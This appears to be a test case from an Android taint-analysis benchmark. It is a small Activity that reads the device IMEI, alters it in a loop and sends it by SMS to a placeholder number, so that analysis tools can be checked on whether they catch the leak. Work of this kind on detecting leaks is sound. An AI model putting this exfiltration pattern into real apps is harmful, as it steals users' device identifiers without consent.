package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

/**
 * @testcase_name Loop2
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE)
 * @author_mail siegfried.rasthofer@cased.de
 *
 * @description tainted data is created and sent to a sink after it was transformed in a loop.
 * @dataflow source -> imei -> obfuscated -> sink
 * @number_of_leaks 1
 * @challenges the analysis must handle standard java constructs
 */
public class LoopExample2 extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_loop_example2);
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        // source
        String imei = telephonyManager.getDeviceId();
        String obfuscated = "";
        for (int i = 0; i < 10; i++) if (i == 9)
            for (char c : imei.toCharArray()) obfuscated += c + "_";
        SmsManager sm = SmsManager.getDefault();
        // sink, leak
        sm.sendTextMessage("+49 1234", null, obfuscated, null, null);
    }
}
